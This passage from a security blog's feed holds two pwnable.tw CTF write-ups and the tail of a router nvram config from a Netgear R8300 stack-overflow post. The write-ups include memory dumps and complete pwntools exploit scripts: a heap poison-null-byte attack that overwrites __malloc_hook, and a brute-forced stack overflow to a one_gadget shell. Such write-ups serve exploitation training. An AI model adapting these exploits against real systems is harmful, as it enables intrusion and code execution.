nvram_set, &quot;&quot;) \</span><br><span class="line">    ENTRY(&quot;lan_if&quot;, nvram_set, &quot;br0&quot;) \</span><br><span class="line">    ENTRY(&quot;lan_ipaddr&quot;, nvram_set, &quot;192.168.65.135&quot;) \</span><br><span class="line">    ENTRY(&quot;lan_bipaddr&quot;, nvram_set, &quot;192.168.65.255&quot;) \</span><br><span class="line">    ENTRY(&quot;lan_netmask&quot;, nvram_set, &quot;255.255.255.0&quot;) \</span><br><span class="line">    /* Set default timezone, required by multiple images */ \</span><br><span class="line">    ENTRY(&quot;time_zone&quot;, nvram_set, &quot;EST5EDT&quot;) \</span><br><span class="line">    /* Set default WAN MAC address, used by &quot;NBG-416N_V1.00(USA.7)C0.zip&quot; (12786) */ \</span><br><span class="line">    ENTRY(&quot;wan_hwaddr_def&quot;, nvram_set, &quot;01:23:45:67:89:ab&quot;) \</span><br><span class="line">    /* Attempt to define LAN/WAN interfaces */ \</span><br><span class="line">    ENTRY(&quot;wan_ifname&quot;, nvram_set, &quot;eth0&quot;) \</span><br><span class="line">    ENTRY(&quot;lan_ifnames&quot;, nvram_set, &quot;eth1 eth2 eth3 eth4&quot;) \</span><br><span class="line">    /* Used by &quot;TEW-638v2%201.1.5.zip&quot; (12898) to prevent crash in &apos;goahead&apos; */ \</span><br><span class="line">    ENTRY(&quot;ethConver&quot;, nvram_set, &quot;1&quot;) \</span><br><span class="line">    /* Used by &quot;Firmware_TEW-411BRPplus_2.07_EU.zip&quot; (13649) to prevent crash in &apos;init&apos; */ \</span><br><span class="line">    ENTRY(&quot;lan_proto&quot;, nvram_set, &quot;dhcp&quot;) \</span><br><span class="line">    ENTRY(&quot;wan_ipaddr&quot;, nvram_set, &quot;0.0.0.0&quot;) \</span><br><span class="line">    ENTRY(&quot;wan_netmask&quot;, nvram_set, &quot;255.255.255.0&quot;) \</span><br><span class="line">    ENTRY(&quot;wanif&quot;, nvram_set, &quot;eth0&quot;) \</span><br><span class="line">    /* Used by &quot;DGND3700 Firmware Version 1.0.0.17(NA).zip&quot; (3425) to prevent crashes */ \</span><br><span class="line">    ENTRY(&quot;time_zone_x&quot;, nvram_set, &quot;0&quot;) \</span><br><span class="line">    ENTRY(&quot;rip_multicast&quot;, nvram_set, &quot;0&quot;) \</span><br><span class="line">    ENTRY(&quot;bs_trustedip_enable&quot;, nvram_set, &quot;0&quot;)\</span><br><span class="line">    /* Used by Netgear router: enable upnpd log */ \</span><br><span class="line">    ENTRY(&quot;upnpd_debug_level&quot;, nvram_set, &quot;3&quot;) \</span><br><span class="line">    /* Used by &quot;Netgear R8300&quot; */ \</span><br><span class="line">    ENTRY(&quot;hwrev&quot;, nvram_set, &quot;MP1T99&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#endif</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;å¤ç°ä¸€ä¸ªNetgear R8300è®¾å¤‡çš„æ ˆæº¢å‡ºæ¼æ´ï¼Œè¦æ±‚æ˜¯ç¼–å†™å…ˆæ¢æµ‹ç›®æ ‡ç‰ˆæœ¬å·ï¼Œå†å‘é€payloadçš„POC&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;ARMå‰è¨€&quot;&gt;&lt;a href=&quot;#ARMå‰è¨€&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    <category term="æ¼æ´å¤ç°" scheme="p1Kk.github.io/categories/æ¼æ´å¤ç°/"/>
    
    
    <category term="iot" scheme="p1Kk.github.io/tags/iot/"/>
    
    <category term="æ ˆæº¢å‡º" scheme="p1Kk.github.io/tags/æ ˆæº¢å‡º/"/>
    
    <category term="è·¯ç”±å™¨" scheme="p1Kk.github.io/tags/è·¯ç”±å™¨/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.tw secret_of_my_heart wp</title>
    <link href="p1Kk.github.io/2020/10/04/tw/tw%20secret_of_my_heart/"/>
    <id>p1Kk.github.io/2020/10/04/tw/tw%20secret_of_my_heart/</id>
    <published>2020-10-03T16:00:00.000Z</published>
    <updated>2024-07-31T10:32:16.543Z</updated>
    
    <content type="html"><![CDATA[<h1 id="secret-of-my-heart"><a href="#secret-of-my-heart" class="headerlink" title="secret_of_my_heart"></a>secret_of_my_heart</h1><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>libcä¸ºubuntu16</p><p><img src="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/secretbug.png" alt></p><ol><li>nameå¤„æ³„éœ²å †åœ°å€â€”&gt;libcåœ°å€</li><li>åˆ©ç”¨poison_null_byteæ„é€ é‡å å †å—</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/50gx 0x55772c5e7000</span><br><span class="line">0x55772c5e7000:0x00000000000000000x0000000000000031# 0</span><br><span class="line">0x55772c5e7010:0x62626262626262620x6262626262626262</span><br><span class="line">0x55772c5e7020:0x62626262626262620x6262626262626262</span><br><span class="line">0x55772c5e7030:0x62626262626262620x0000000000020fd1</span><br><span class="line">0x55772c5e7040:0x000055772c5e71100x00007fdaa1abeb78</span><br><span class="line">0x55772c5e7050:0x63636363636363630x6363636363636363</span><br><span class="line">0x55772c5e7060:0x63636363636363630x6363636363636363</span><br><span class="line">0x55772c5e7070:0x63636363636363630x6363636363636363</span><br><span class="line">0x55772c5e7080:0x63636363636363630x6363636363636363</span><br><span class="line">0x55772c5e7090:0x63636363636363630x6363636363636363</span><br><span class="line">0x55772c5e70a0:0x63636363636363630x6363636363636363</span><br><span class="line">0x55772c5e70b0:0x63636363636363630x6363636363636363</span><br><span class="line">0x55772c5e70c0:0x00000000000000900x0000000000000050# å¯è¢«ä¿®æ”¹å— 3</span><br><span class="line">0x55772c5e70d0:0x63636363636363630x6363636363636363</span><br><span class="line">0x55772c5e70e0:0x63636363636363630x6363636363636363</span><br><span class="line">0x55772c5e70f0:0x63636363636363630x6363636363636363</span><br><span class="line">0x55772c5e7100:0x63636363636363630x6363636363636363</span><br><span class="line">0x55772c5e7110:0x61616161616161000x0000000000000021</span><br><span class="line">0x55772c5e7120:0x00007fdaa1abeb780x00007fdaa1abeb78</span><br><span class="line">0x55772c5e7130:0x00000000000000200x0000000000000000</span><br><span class="line">0x55772c5e7140:0x00000000000001100x0000000000000110</span><br><span class="line">0x55772c5e7150:0x61616161616161610x6161616161616161</span><br><span class="line">0x55772c5e7160:0x61616161616161610x6161616161616161</span><br><span class="line">0x55772c5e7170:0x00000000000000000x0000000000000000</span><br><span class="line">0x55772c5e7180:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/50gx 0x55ff8cab6000</span><br><span class="line">0x55ff8cab6000:0x00000000000000000x0000000000000031</span><br><span class="line">0x55ff8cab6010:0x00000000000000000x0000000000000000</span><br><span class="line">0x55ff8cab6020:0x00000000000000000x0000000000000000</span><br><span class="line">0x55ff8cab6030:0x0068732f6e69622f0x0000000000000091# å†æ¬¡ç”³è¯·0x80å¤§å°åˆ°è¿™å—ï¼Œ1</span><br><span class="line">0x55ff8cab6040:0x000055ff8cab00640x00007f220ed26b78</span><br><span class="line">0x55ff8cab6050:0x63636363636363630x6363636363636363</span><br><span class="line">0x55ff8cab6060:0x63636363636363630x6363636363636363</span><br><span class="line">0x55ff8cab6070:0x63636363636363630x6363636363636363</span><br><span class="line">0x55ff8cab6080:0x63636363636363630x6363636363636363</span><br><span class="line">0x55ff8cab6090:0x63636363636363630x6363636363636363</span><br><span class="line">0x55ff8cab60a0:0x63636363636363630x6363636363636363</span><br><span class="line">0x55ff8cab60b0:0x63636363636363630x6363636363636363</span><br><span class="line">0x55ff8cab60c0:0x00000000000000900x0000000000000111# 2, 3</span><br><span class="line">0x55ff8cab60d0:0x64646464646464640x6464646464646464</span><br><span class="line">0x55ff8cab60e0:0x64646464646464640x6464646464646464</span><br><span class="line">0x55ff8cab60f0:0x64646464646464640x6464646464646464</span><br><span class="line">0x55ff8cab6100:0x64646464646464640x6464646464646464</span><br><span class="line">0x55ff8cab6110:0x64646464646464640x6464646464646464</span><br><span class="line">0x55ff8cab6120:0x64646464646464640x6464646464646464</span><br><span class="line">0x55ff8cab6130:0x64646464646464640x0000000000000070# fake size</span><br><span class="line">0x55ff8cab6140:0x00000000000001000x0000000000000110</span><br><span class="line">0x55ff8cab6150:0x61616161616161610x6161616161616161</span><br><span class="line">0x55ff8cab6160:0x61616161616161610x6161616161616161</span><br><span class="line">0x55ff8cab6170:0x00000000000000000x0000000000000000</span><br><span class="line">0x55ff8cab6180:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>å†free2ï¼Œæ‰“å°3å°±å¯ä»¥å¾—åˆ°libcåŸºå€ã€‚</p><ol start="3"><li>æ”¹<code>__malloc_hook</code>ä¸º<code>system</code>ï¼Œå› ä¸º<code>__free_hook</code>å‘¨å›´æ²¡æœ‰ç¬¦åˆæ¡ä»¶çš„fake sizeï¼Œå…¨æ˜¯00ï¼Œæ‰€ä»¥é€‰æ‹©æ”¹<code>__malloc_hook</code></li></ol><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">#!usr/bin/python</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">binary = &quot;./secret_of_my_heart&quot;</span><br><span class="line">ip = &quot;chall.pwnable.tw&quot;</span><br><span class="line">port = 10302</span><br><span class="line">elf = ELF(binary)</span><br><span class="line"></span><br><span class="line">def add(size, sec):</span><br><span class="line">io.sendlineafter(&quot;Your choice :&quot;, str(1))</span><br><span class="line">io.sendlineafter(&quot; : &quot;, str(size))</span><br><span class="line">io.sendafter(&quot; :&quot;, &quot;k&quot;*0x20)</span><br><span class="line">io.sendafter(&quot; :&quot;, sec)</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">io.sendlineafter(&quot;Your choice :&quot;, str(2))</span><br><span class="line">io.sendlineafter(&quot;Index :&quot;, str(idx))</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">io.sendlineafter(&quot;Your choice :&quot;, str(3))</span><br><span class="line">io.sendlineafter(&quot;Index :&quot;, str(idx))</span><br><span class="line"></span><br><span class="line">def pwn(ip, port, debug):</span><br><span class="line">global io</span><br><span class="line">if debug == 1:</span><br><span class="line">io = process(binary)</span><br><span class="line">libc = elf.libc</span><br><span class="line">one = [0x45226, 0x4527a, 0xf0364, 0xf1207]</span><br><span class="line"># libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line">else:</span><br><span class="line">io = remote(ip, port)</span><br><span class="line">libc = ELF(&quot;libc_64.so.6&quot;)</span><br><span class="line">one = [0x45216, 0x4526a, 0xef6c4, 0xf0567]</span><br><span class="line"></span><br><span class="line">add(0x20, &quot;a&quot; * 0x20)# 0</span><br><span class="line">show(0)</span><br><span class="line">io.recvuntil(&quot;k&quot;*0x20)</span><br><span class="line">heap = u64(io.recv(6).ljust(8, &apos;\x00&apos;)) - 0x10</span><br><span class="line">success(&quot;heap = &quot;+hex(heap))</span><br><span class="line">add(0x100, &quot;a&quot; * 0xF0+p64(0x100))# 1</span><br><span class="line">add(0x100, &quot;a&quot; * 0x20)# 2</span><br><span class="line">delete(1)</span><br><span class="line">delete(0)</span><br><span class="line">payload = &quot;/bin/sh\x00&quot;</span><br><span class="line">payload = payload.rjust(0x28, &quot;\x00&quot;)</span><br><span class="line">add(0x28, payload)# 0</span><br><span class="line"># delete(2)</span><br><span class="line">add(0x80, &quot;c&quot; * 0x80)</span><br><span class="line">add(0x40, &quot;c&quot; * 0x40)# ...</span><br><span class="line"></span><br><span class="line">delete(1)</span><br><span class="line">delete(2)</span><br><span class="line"></span><br><span class="line">add(0x80, &quot;d&quot;)# 1</span><br><span class="line">add(0x100, &quot;d&quot;*0x68 + p64(0x70))# 2/3</span><br><span class="line">add(0x80, &quot;d&quot;)# 4</span><br><span class="line"></span><br><span class="line">delete(2)</span><br><span class="line">show(3)</span><br><span class="line">io.recvuntil(&quot;Secret : &quot;)</span><br><span class="line">libc_base = u64(io.recv(6).ljust(8, &apos;\x00&apos;))-88-0x10-libc.symbols[&apos;__malloc_hook&apos;]# -0x3C4B78</span><br><span class="line">success(&quot;libc_base = &quot;+hex(libc_base))</span><br><span class="line"></span><br><span class="line">malloc_addr = libc_base + libc.sym[&apos;__malloc_hook&apos;]</span><br><span class="line">sys_addr = libc_base + libc.sym[&apos;system&apos;]</span><br><span class="line">binsh_addr = libc_base + libc.search(&quot;/bin/sh\x00&quot;).next()</span><br><span class="line">one = libc_base + one[2]</span><br><span class="line">success(&quot;malloc_addr = &quot;+hex(malloc_addr))</span><br><span class="line">success(&quot;sys_addr = &quot;+hex(sys_addr))</span><br><span class="line">success(&quot;binsh_addr = &quot;+hex(binsh_addr))</span><br><span class="line"></span><br><span class="line">delete(1)</span><br><span class="line">add(0x100, &quot;e&quot;*0x80+p64(0)+p64(0x71))</span><br><span class="line"></span><br><span class="line">delete(3)</span><br><span class="line">delete(1)</span><br><span class="line"></span><br><span class="line">add(0x100, &quot;f&quot;*0x80+p64(0)+p64(0x71)+p64(malloc_addr-0x23))</span><br><span class="line">add(0x60, &quot;f&quot;)</span><br><span class="line"># add(0x60, &quot;\x00&quot;*0x13+p64(sys_addr))</span><br><span class="line">add(0x60, &quot;\x00&quot;*0x13+p64(one))</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">io.sendlineafter(&quot;Your choice :&quot;, str(1))</span><br><span class="line">io.sendlineafter(&quot; : &quot;, str(0x30))</span><br><span class="line">io.sendafter(&quot; :&quot;, &quot;k&quot;*0x20)</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">delete(3)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">pwn(ip, port, 0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">unk_202018 + 48LL * i             :         secret_size</span><br><span class="line">unk_202018 + 48LL * i + 8         :         name</span><br><span class="line">unk_202018 + 48LL * i + 0x28      :         secret_addr</span><br><span class="line"></span><br><span class="line">&apos;&apos;&apos;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;secret-of-my-heart&quot;&gt;&lt;a href=&quot;#secret-of-my-heart&quot; class=&quot;headerlink&quot; title=&quot;secret_of_my_heart&quot;&gt;&lt;/a&gt;secret_of_my_heart&lt;/h1&gt;&lt;h2 id=&quot;åˆ†</summary>
      
    
    
    
    <category term="oj" scheme="p1Kk.github.io/categories/oj/"/>
    
    
    <category term="pwn" scheme="p1Kk.github.io/tags/pwn/"/>
    
    <category term="wp" scheme="p1Kk.github.io/tags/wp/"/>
    
    <category term="tw" scheme="p1Kk.github.io/tags/tw/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.tw babystack wp</title>
    <link href="p1Kk.github.io/2020/10/04/tw/tw%20babystack/"/>
    <id>p1Kk.github.io/2020/10/04/tw/tw%20babystack/</id>
    <published>2020-10-03T16:00:00.000Z</published>
    <updated>2020-10-04T12:08:56.685Z</updated>
    
    <content type="html"><![CDATA[<h1 id="babystack"><a href="#babystack" class="headerlink" title="babystack"></a>babystack</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>copyæ—¶å­˜åœ¨æ ˆæº¢å‡º</p><p>é¦–å…ˆæ˜¯<code>strlen</code>å‡½æ•°ç”¨æ¥è®¡ç®—æŒ‡å®šçš„å­—ç¬¦ä¸²s çš„é•¿åº¦ï¼Œä¸åŒ…æ‹¬ç»“æŸå­—ç¬¦â€\0â€</p><p><code>strncmp</code>å‡½æ•°æ˜¯æŒ‡å®šæ¯”è¾ƒsizeä¸ªå­—ç¬¦ï¼Œ<code>strcmp</code>å‡½æ•°æ¯”è¾ƒæ•´ä¸ªå­—ç¬¦ï¼Œç›´åˆ°å‡ºç°ä¸åŒçš„å­—ç¬¦æˆ–é‡â€<strong>\0â€</strong>ä¸ºæ­¢</p><p>æ‰€ä»¥å¯ä»¥é€šè¿‡00æˆªæ–­æ¯”è¾ƒï¼Œåˆ©ç”¨loginæ¯”è¾ƒï¼Œä¹Ÿå¯ä»¥é€å­—èŠ‚è¿›è¡Œçˆ†ç ´ã€‚è¿™æ—¶å€™è€ƒè™‘æœ‰æ²¡æœ‰å‡½æ•°åœ°å€å¯ä»¥çˆ†ç ´æ³„éœ²â€¦</p><p>copyä¹‹åï¼Œæ ˆä¸­æœ‰libcåœ°å€äº†ï¼Œçˆ†ç ´å¾—åˆ°libcåŸºå€</p><p><img src="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/babystack2.png" alt></p><p><del>ä½†æ˜¯æˆ‘ä¸çŸ¥é“æ€ä¹ˆæŠŠè¿™ä¸ªåœ°å€å‰é¢çš„\x00å»æ‰â€¦æˆ–è€…æ˜¯æˆ‘ç†è§£æœ‰é—®é¢˜ovoï¼Ÿï¼Ÿï¼Ÿ</del></p><p><del>å»çœ‹äº†çœ‹ç½‘ä¸Šçš„..è°ƒè¯•çœ‹å’Œæˆ‘çš„ä¸€æ ·å­ï¼ŒæœåŠ¡å™¨çš„â€¦å¤ªæ…¢äº†â€¦æ²¡æ³•è¯•qaqï¼ˆä»¥åå†è¯´ğŸ˜¤</del></p><p>(å“¦â€¦è¿‡äº†ä¿©æœˆæ¢äº†ä¸ªè™šæ‹Ÿæœºï¼Œåˆå¥½äº†ï¼Œåœ¨ <em>1\naaaaaa</em> åå°±æœ‰åœ°å€äº†â€¦)</p><p>å› ä¸ºæ ˆç©ºé—´æ²¡æœ‰è¿›è¡Œåˆå§‹åŒ–ï¼Œä¸”login copyæ ˆç©ºé—´é‡å ï¼Œåˆ©ç”¨è¿™é‡Œè¦†ç›–è¿”å›åœ°å€ä¸ºone_gadgetã€‚</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">#!usr/bin/python</span><br><span class="line">from pwn import *</span><br><span class="line">import os</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">binary = &quot;./babystack&quot;</span><br><span class="line">ip = &quot;chall.pwnable.tw&quot;</span><br><span class="line">port = 10205</span><br><span class="line">elf = ELF(binary)</span><br><span class="line"></span><br><span class="line">def login(passwd):</span><br><span class="line">io.sendlineafter(&quot;&gt;&gt; &quot;, &quot;1&quot;)</span><br><span class="line">io.sendafter(&quot;passowrd :&quot;, passwd)</span><br><span class="line">return io.recvuntil(&quot;\n&quot;)</span><br><span class="line"></span><br><span class="line">def logout():</span><br><span class="line">io.sendlineafter(&quot;&gt;&gt; &quot;, &quot;1&quot;)</span><br><span class="line"></span><br><span class="line">def copy(copy):</span><br><span class="line">io.sendlineafter(&quot;&gt;&gt; &quot;, &quot;3&quot;)</span><br><span class="line">io.sendafter(&quot;Copy :&quot;, copy)</span><br><span class="line"></span><br><span class="line">def ex():</span><br><span class="line">io.sendlineafter(&quot;&gt;&gt; &quot;, &quot;2&quot;)</span><br><span class="line"></span><br><span class="line">def buf(length, cover):</span><br><span class="line">for i in range(length):</span><br><span class="line">for q in range(1,256):</span><br><span class="line">if &apos;Login&apos; in login(cover+chr(q)+&apos;\n&apos;):</span><br><span class="line">cover+=chr(q)</span><br><span class="line">logout()</span><br><span class="line">break</span><br><span class="line">return cover</span><br><span class="line"></span><br><span class="line">def pwn(ip, port, debug):</span><br><span class="line">global io</span><br><span class="line">if debug == 1:</span><br><span class="line">io = process(binary)</span><br><span class="line">libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line"># gdb.attach(io, &quot;b*0x08048819&quot;)</span><br><span class="line">one = [0x45226, 0x4527a, 0xf0364, 0xf1207]</span><br><span class="line">else:</span><br><span class="line">io = remote(ip, port)</span><br><span class="line">libc = ELF(&quot;libc_64.so.6&quot;)</span><br><span class="line">one = [0xef6c4, 0x45216, 0x4526a, 0xf0567]</span><br><span class="line">guess = buf(0x10, &quot;&quot;)</span><br><span class="line">login(&apos;\x00&apos;+&apos;a&apos;*0x57)</span><br><span class="line">copy(&apos;a&apos;*0x40)</span><br><span class="line">logout()</span><br><span class="line"># 0x7ffb87ac0000---0x7ffb87b2ffc4 &lt;__GI__IO_setvbuf+324&gt;</span><br><span class="line">libc_base=u64(buf(6,&quot;a&quot;*0x10+&apos;1\n&apos;+&apos;a&apos;*6)[0x18:].ljust(8, &apos;\x00&apos;))-324-0x4F730-libc.symbols[&apos;__libc_start_main&apos;]</span><br><span class="line">one_gadget = libc_base + one[3]</span><br><span class="line"></span><br><span class="line">payload=&apos;\x00&apos;+&apos;a&apos;*0x3f+guess+&apos;a&apos;*0x18+p64(one_gadget)</span><br><span class="line">login(payload)</span><br><span class="line">copy(&apos;a&apos; * 0x10)</span><br><span class="line">ex()</span><br><span class="line"></span><br><span class="line">success(&quot;libc_base = &quot;+hex(libc_base))</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">pwn(ip, port, 0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br><span class="line"></span><br><span class="line">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xef6c4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">0xf0567 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br><span class="line">&apos;&apos;&apos;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;babystack&quot;&gt;&lt;a href=&quot;#babystack&quot; class=&quot;headerlink&quot; title=&quot;babystack&quot;&gt;&lt;/a&gt;babystack&lt;/h1&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;t</summary>
      
    
    
    
    <category term="oj" scheme="p1Kk.github.io/categories/oj/"/>
    
    
    <category term="pwn" scheme="p1Kk.github.io/tags/pwn/"/>
    
    <category term="wp" scheme="p1Kk.github.io/tags/wp/"/>
    
    <category term="tw" scheme="p1Kk.github.io/tags/tw/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.tw secretgarden wp</title>
    <link href="p1Kk.github.io/2020/07/30/tw/tw%20secretgarden/"/>
    <id>p1Kk.github.io/2020/07/30/tw/tw%20secretgarden/</id>
    <published>2020-07-29T16:00:00.000Z</published>
    <updated>2020-10-04T12:09:16.139Z</updated>
    
